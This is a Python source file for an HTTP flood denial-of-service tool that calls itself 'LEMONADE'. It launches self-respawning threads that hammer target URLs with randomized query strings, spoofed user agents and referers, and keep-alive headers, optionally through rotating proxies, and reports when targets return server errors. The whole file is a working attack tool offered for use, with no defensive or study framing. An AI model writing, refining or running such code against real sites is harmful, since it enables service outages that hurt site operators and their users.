import threading
import random
import json
import re
import requests
import sys
import time
import os


with open("./config.json","r") as f:
    config = json.load(f);


url = ""
host = ""
useragents = ""
referers = ""
request_counter = 0

flag = 0

def set_flag(num):
    global flag
    flag = num

def isignorestatus(statscode):
    global config
    if config["safemode"] == True:
        for i in config["ignorestatuscode"]:
            if i == statscode:
                return True
    return False

def requestcnt():
    global request_counter
    request_counter += 1

def useragent_list():
    global config
    global useragents
    with open(config["useragents"],"r") as f:
        useragent = f.read().split("\n")
    useragents = useragent
    return useragent

def referer_list():
    global config
    global referers
    with open(config["referers"],"r") as f:
        referer = f.read().split("\n")
    referers = referer
    return referer

def buildblock(size):
    out_str = ""
    for i in range(size):
        a = random.randint(65,90)
        out_str += chr(a)
    return out_str

if(config["useconfigurl"] == False):
    url = []
    url.append(input("URL:"))
    if str(url[0]).count("/")==2:
        url[0] = url[0] + "/"
    m = re.search('(https?\://)?([^/]*)/?.*', url[0])
    host = []
    host.append(m.group(2))
else:
    url = list(config["url"])
    for i in range(len(url)):
        k = url[i]
        if str(k).count("/")==2:
            k = k + "/"
    host = []
    for i in range(len(url)):
        m = re.search('(https?\://)?([^/]*)/?.*', url[i])
        host.append(m.group(2))

thrd = int(input("Thread Count:"))
if thrd > config["thread"]["maxthreads"] and config["thread"]["limiter"] == True:
    thrd = config["thread"]["maxthreads"]

with open(config["proxies"],"r") as f:
    proxies = f.read().split("\n")

useragent_list()
referer_list()

class httpcall(threading.Thread):
    def __init__(self):
        global config
        threading.Thread.__init__(self)
        self.randomdelay = config["thread"]["randomdelay"]
        self.payload = str(config["payload"])
        self.json = str(config["json"])
        self.useragents = useragents
        self.referers = referers
        self.limiter = config["thread"]["limiter"]
        self.mindelay = int(config["thread"]["mindelay"])
        self.maxdelay = int(config["thread"]["maxdelay"])
        self.method = str(config["method"]).lower()
        self.timeout = int(config["thread"]["timeout"])
        self.normaldelay = int(config["thread"]["normaldelay"])
        self.usenormaldelay = config["thread"]["usenormaldelay"]
        self.nodelay = config["thread"]["nodelay"]
        
        self.useproxies = config["useproxies"]
        self.limiter = config["thread"]["limiter"]
    def run(self):
        global proxies
        global url
        global host
        for __ in range(5):
            for k in range(len(url)):
                proxy = ""
                if self.useproxies == True:
                    proxy = proxies.pop(0)
                    
                if url[k].count("?") > 0:
                    param_joiner = "&"
                else:
                    param_joiner = "?"
                    
                if proxy == "":
                    try:
                        lres = requests.request(self.method,f"{url[k]}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
                            "User-Agent": random.choice(self.useragents),
                            "Cache-Control": "no-cache",
                            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
                            "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
                            "Keep-Alive": str(random.randint(110,120)),
                            "Connection": "keep-alive",
                            "Host": host[k]
                        }, data=self.payload, json=self.json, timeout=self.timeout)
                        proxies.append(proxy)
                        if str(lres.status_code).startswith("50"):
                            set_flag(1)
                            print("Res 500 "+host[k])
                            s = url[k]
                            b = host[k]
                            url.remove(s)
                            host.remove(b)
                        elif isignorestatus(lres.status_code):
                            requestcnt()
                        else:
                            print("A request error has occurred. StatusCode:"+lres.status_code+" "+host[k])
                            s = url[k]
                            b = host[k]
                            url.remove(s)
                            host.remove(b)
                    except:
                        pass
                else:
                    try:
                        lres = requests.request(self.method,f"{url[k]}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
                            "User-Agent": random.choice(self.useragents),
                            "Cache-Control": "no-cache",
                            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
                            "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
                            "Keep-Alive": str(random.randint(110,120)),
                            "Connection": "keep-alive",
                            "Host": host[k]
                        }, data=self.payload, json=self.json, timeout=self.timeout, proxies={
                            "http":"http://"+proxy,
                            "https":"http://"+proxy,
                        })
                        proxies.append(proxy)
                        if str(lres.status_code).startswith("50"):
                            set_flag(1)
                            print("Res 500 "+host[k])
                            s = url[k]
                            b = host[k]
                            url.remove(s)
                            host.remove(b)
                        elif isignorestatus(lres.status_code):
                            requestcnt()
                        else:
                            print("A request error has occurred. StatusCode:"+lres.status_code+" "+host[k])
                            s = url[k]
                            b = host[k]
                            url.remove(s)
                            host.remove(b)
                    except:
                        pass
            if self.nodelay == True:
                continue
            elif self.limiter == True:
                time.sleep(random.randint(600,3000) / 1000)
            elif self.randomdelay == True:
                time.sleep(random.randint(self.mindelay,self.maxdelay) / 1000)
            elif self.usenormaldelay:
                time.sleep(self.normaldelay / 1000)
            else:
                pass
        httpcall().start()
        return

class MonitorThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        while True:
            global request_counter
            print(f"Summary Requested: {request_counter}")
            time.sleep(5)


MonitorThread().start()
for i in range(thrd):
    httpcall().start()
try:
    while True:
        #print(f"Summary Requested: {request_counter}")
        if flag == 2:
            print("LEMONADE stopped Attacking")
            os._exit()
        time.sleep(0.05)
except KeyboardInterrupt:
    print("LEMONADE stopped Attacking")
    os._exit()